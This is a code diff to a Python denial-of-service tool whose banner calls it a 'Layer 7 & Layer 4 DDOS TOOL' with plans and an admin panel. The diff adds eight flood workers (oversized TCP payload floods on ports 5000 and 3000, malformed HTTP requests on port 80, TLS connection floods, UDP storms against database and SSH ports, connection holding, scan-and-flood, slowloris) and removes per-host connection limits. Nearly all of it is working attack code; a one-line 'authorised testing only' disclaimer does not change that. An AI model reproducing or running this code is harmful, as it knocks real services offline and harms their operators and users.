@@ -2,10 +2,10 @@
 """
     ┌─────────────────────────────────────────────────┐
     │   LAYER 7 & LAYER 4 DDOS TOOL                   │
-    │   WITH PROXY ROTATION, BYPASS & ADMIN PANEL     │
+    │   WITH EXTERMINATOR METHODS & MAX RPS           │
     │   SPRAY YOUR PAYLOAD IN MY PORT !                │
     └─────────────────────────────────────────────────┘
-    Author: bob (extreme performance mode)
+    Author: bob (exterminator integration)
     Legal: For authorised testing only.
 """
 
@@ -186,14 +186,22 @@ ALL_L7_METHODS = sorted(list(set(
     method for plan in PLANS.values() for method in plan['methods']
 )))
 
-# Layer 4 methods
+# Layer 4 methods (including exterminator methods)
 LAYER4_METHODS = [
     'TCP SYN FLOOD',
     'UDP FLOOD',
     'ICMP FLOOD',
     'SLOWLORIS',
     'CONNECTION EXHAUSTION',
-    'PORT SCAN & ATTACK'
+    'PORT SCAN & ATTACK',
+    'NUCLEAR PORT 5000',
+    'NUCLEAR PORT 3000',
+    'PORT 80 APOCALYPSE',
+    'SSL EXTERMINATOR',
+    'UDP EXTERMINATOR',
+    'CONNECTION EXTERMINATOR',
+    'PORT SCAN EXTERMINATOR',
+    'SLOWLORIS EXTERMINATOR'
 ]
 
 # Combined for admin
@@ -224,6 +232,14 @@ METHOD_DESCRIPTIONS = {
     'SLOWLORIS': 'Layer 4 – holds many connections open with partial requests.',
     'CONNECTION EXHAUSTION': 'Layer 4 – opens thousands of TCP connections and keeps them alive.',
     'PORT SCAN & ATTACK': 'Layer 4 – scans for open ports and immediately floods them.',
+    'NUCLEAR PORT 5000': 'Layer 4 – massive payload flood on port 5000.',
+    'NUCLEAR PORT 3000': 'Layer 4 – massive payload flood on port 3000.',
+    'PORT 80 APOCALYPSE': 'Layer 4 – HTTP floods on port 80.',
+    'SSL EXTERMINATOR': 'Layer 4 – SSL/TLS connection floods on port 443.',
+    'UDP EXTERMINATOR': 'Layer 4 – UDP packet storm to multiple critical ports.',
+    'CONNECTION EXTERMINATOR': 'Layer 4 – opens and holds thousands of TCP connections.',
+    'PORT SCAN EXTERMINATOR': 'Layer 4 – scans for open ports and immediately floods them.',
+    'SLOWLORIS EXTERMINATOR': 'Layer 4 – slowloris on ports 5000 and 3000.',
 }
 
 # Full user-agent list (100+ entries)
@@ -670,8 +686,8 @@ def run_process_workers(process_id, url, method, workers_per_process, duration, 
 async def asyncio_worker_process(process_id, url, method, workers, duration, req_counter, err_counter, status_dict, latency_list):
     """Asyncio coroutine for a process."""
     end_time = time.time() + duration
-    # Aggressive connection limits for max RPS
-    connector = aiohttp.TCPConnector(limit=0, limit_per_host=1000, force_close=False, enable_cleanup_closed=True, ssl=False)
+    # Max concurrency: no limits per host, no total limit
+    connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, force_close=False, enable_cleanup_closed=True, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
         tasks = []
         for i in range(workers):
@@ -738,8 +754,189 @@ async def run_layer7_mp(url, method, total_workers, duration, plan_name, req_cou
         for p in processes:
             p.join()
 
-# ================== LAYER 4 WORKERS ==================
-# Exactly like exterminator.py: per-packet output with random hex ID.
+# ================== LAYER 4 WORKERS (Exterminator style) ==================
+# Each worker prints a line per packet with random hex ID.
+
+def nuclear_port_5000_worker(target_ip, worker_id, end_time):
+    """Flood port 5000 with massive payloads."""
+    while time.time() < end_time:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            sock.connect((target_ip, 5000))
+            # Send large payloads
+            payloads = [
+                b'A' * 65535,
+                os.urandom(65535),
+                b'GET / HTTP/1.1\r\n' + b'X-' * 32767 + b'\r\n\r\n',
+                b'POST /upload HTTP/1.1\r\nContent-Length: 999999999\r\n\r\n' + b'B' * 65535
+            ]
+            for payload in payloads:
+                try:
+                    sock.send(payload)
+                    with print_lock:
+                        hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
+                        print(f"[NUCLEAR5000] {target_ip}:5000 HEXID:{hex_id}")
+                except:
+                    break
+            sock.close()
+        except:
+            pass
+
+def nuclear_port_3000_worker(target_ip, worker_id, end_time):
+    """Flood port 3000 with massive payloads."""
+    while time.time() < end_time:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            sock.connect((target_ip, 3000))
+            payloads = [
+                b'GET / HTTP/1.1\r\nHost: localhost:3000\r\n\r\n',
+                b'POST / HTTP/1.1\r\nContent-Length: 1000000\r\n\r\n' + b'X' * 65535,
+                b'DEBUG / HTTP/1.1\r\n\r\n',
+                b'\x00' * 65535,
+                b'%s' * 10000,
+            ]
+            for payload in payloads:
+                try:
+                    sock.send(payload)
+                    with print_lock:
+                        hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
+                        print(f"[NUCLEAR3000] {target_ip}:3000 HEXID:{hex_id}")
+                except:
+                    break
+            sock.close()
+        except:
+            pass
+
+def port_80_apocalypse_worker(target_ip, worker_id, end_time):
+    """HTTP floods on port 80."""
+    while time.time() < end_time:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            sock.connect((target_ip, 80))
+            crash_requests = [
+                f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode(),
+                f"GET /{'A'*10000} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode(),
+                f"POST /upload HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 999999999\r\n\r\n".encode(),
+                f"GET / HTTP/0.9\r\n\r\n".encode(),
+                f"INJECT / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode(),
+            ]
+            for req in crash_requests:
+                try:
+                    sock.send(req)
+                    with print_lock:
+                        hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
+                        print(f"[PORT80] {target_ip}:80 HEXID:{hex_id}")
+                except:
+                    break
+            sock.close()
+        except:
+            pass
+
+def ssl_exterminator_worker(target_ip, worker_id, end_time):
+    """SSL/TLS connection floods on port 443."""
+    context = ssl.create_default_context()
+    context.check_hostname = False
+    context.verify_mode = ssl.CERT_NONE
+    while time.time() < end_time:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)
+            ssl_sock.connect((target_ip, 443))
+            for i in range(10):
+                try:
+                    ssl_sock.send(os.urandom(8192))
+                    with print_lock:
+                        hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
+                        print(f"[SSL] {target_ip}:443 HEXID:{hex_id}")
+                except:
+                    break
+            ssl_sock.close()
+        except:
+            pass
+
+def udp_exterminator_worker(target_ip, worker_id, end_time):
+    """UDP packet storm to multiple critical ports."""
+    critical_ports = [5000, 3000, 80, 443, 8080, 8443, 22, 21, 53, 3306, 5432, 27017]
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while time.time() < end_time:
+        try:
+            for port in critical_ports:
+                for i in range(10):
+                    payload = os.urandom(1472)
+                    sock.sendto(payload, (target_ip, port))
+                    with print_lock:
+                        hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
+                        print(f"[UDP-EX] {target_ip}:{port} HEXID:{hex_id}")
+        except:
+            pass
+
+def connection_exterminator_worker(target_ip, worker_id, end_time):
+    """Open and hold many TCP connections."""
+    connections = []
+    while time.time() < end_time:
+        try:
+            for port in [5000, 3000, 80, 443]:
+                for i in range(5):
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(30)
+                    sock.connect((target_ip, port))
+                    connections.append(sock)
+                    with print_lock:
+                        hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
+                        print(f"[CONN-EX] {target_ip}:{port} HEXID:{hex_id}")
+            # Keep alive
+            time.sleep(0.5)
+        except:
+            pass
+
+def port_scan_exterminator_worker(target_ip, worker_id, end_time):
+    """Scan for open ports and flood them."""
+    all_ports = list(range(1, 1001))
+    while time.time() < end_time:
+        for port in random.sample(all_ports, 50):
+            if time.time() >= end_time:
+                break
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                result = sock.connect_ex((target_ip, port))
+                if result == 0:
+                    for i in range(10):
+                        try:
+                            sock.send(os.urandom(1024))
+                            with print_lock:
+                                hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
+                                print(f"[SCAN-EX] {target_ip}:{port} HEXID:{hex_id}")
+                        except:
+                            break
+                sock.close()
+            except:
+                pass
+
+def slowloris_exterminator_worker(target_ip, worker_id, end_time):
+    """Slowloris on ports 5000 and 3000."""
+    slowloris_connections = []
+    while time.time() < end_time:
+        try:
+            for port in [5000, 3000]:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(45)
+                sock.connect((target_ip, port))
+                partial = f"GET /{os.urandom(100).hex()} HTTP/1.1\r\nHost: {target_ip}\r\n".encode()
+                sock.send(partial)
+                slowloris_connections.append(sock)
+                with print_lock:
+                    hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
+                    print(f"[SLOW-EX] {target_ip}:{port} HEXID:{hex_id}")
+            time.sleep(5)
+        except:
+            pass
+
+# Original Layer 4 workers (kept for compatibility)
 def tcp_syn_flood_worker(target_ip, target_port, worker_id, end_time):
     if not HAS_SCAPY:
         return
@@ -752,7 +949,7 @@ def tcp_syn_flood_worker(target_ip, target_port, worker_id, end_time):
             send(packet, verbose=False)
             with print_lock:
                 hex_id = ''.join(random.choices('0123456789ABCDEF', k=8))
-                print(f"[TCP] {target_ip}:{target_port} HEXID:{hex_id}")
+                print(f"[SYN] {target_ip}:{target_port} HEXID:{hex_id}")
         except:
             pass
 
@@ -849,6 +1046,7 @@ def port_scan_worker(target_ip, worker_id, end_time):
 async def run_layer4_attack(target_ip, method, workers, duration, plan_name):
     """Run Layer 4 attack using thread pool."""
     target_ports = []
+    # Determine if method requires port input
     if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
         port_input = input(f"  Target port(s) (e.g., 80,443, or range 1-1024) → ").strip()
         if '-' in port_input:
@@ -859,6 +1057,7 @@ async def run_layer4_attack(target_ip, method, workers, duration, plan_name):
         else:
             target_ports = [int(port_input)]
     
+    # Map method to worker function
     worker_func = None
     if method == 'TCP SYN FLOOD':
         worker_func = tcp_syn_flood_worker
@@ -872,6 +1071,22 @@ async def run_layer4_attack(target_ip, method, workers, duration, plan_name):
         worker_func = connection_exhaustion_worker
     elif method == 'PORT SCAN & ATTACK':
         worker_func = port_scan_worker
+    elif method == 'NUCLEAR PORT 5000':
+        worker_func = nuclear_port_5000_worker
+    elif method == 'NUCLEAR PORT 3000':
+        worker_func = nuclear_port_3000_worker
+    elif method == 'PORT 80 APOCALYPSE':
+        worker_func = port_80_apocalypse_worker
+    elif method == 'SSL EXTERMINATOR':
+        worker_func = ssl_exterminator_worker
+    elif method == 'UDP EXTERMINATOR':
+        worker_func = udp_exterminator_worker
+    elif method == 'CONNECTION EXTERMINATOR':
+        worker_func = connection_exterminator_worker
+    elif method == 'PORT SCAN EXTERMINATOR':
+        worker_func = port_scan_exterminator_worker
+    elif method == 'SLOWLORIS EXTERMINATOR':
+        worker_func = slowloris_exterminator_worker
     else:
         print("  Unknown Layer 4 method.")
         return
@@ -883,17 +1098,15 @@ async def run_layer4_attack(target_ip, method, workers, duration, plan_name):
         while time.time() < end_time:
             if target_ports:
                 port = random.choice(target_ports) if target_ports else None
+                # For methods that need a port
                 if method in ['TCP SYN FLOOD', 'UDP FLOOD', 'SLOWLORIS', 'CONNECTION EXHAUSTION']:
                     worker_func(target_ip, port, worker_id, end_time)
-                elif method == 'ICMP FLOOD':
-                    worker_func(target_ip, worker_id, end_time)
-                elif method == 'PORT SCAN & ATTACK':
+                else:
+                    # Methods that don't need a port (ICMP, port scan, exterminator methods)
                     worker_func(target_ip, worker_id, end_time)
             else:
-                if method == 'ICMP FLOOD':
-                    worker_func(target_ip, worker_id, end_time)
-                elif method == 'PORT SCAN & ATTACK':
-                    worker_func(target_ip, worker_id, end_time)
+                # No ports needed
+                worker_func(target_ip, worker_id, end_time)
     
     with ThreadPoolExecutor(max_workers=workers) as executor:
         futures = [executor.submit(worker_wrapper, i) for i in range(workers)]
@@ -1531,4 +1744,4 @@ def main():
             time.sleep(1)
 
 if __name__ == "__main__":
-    main()
+    main() 
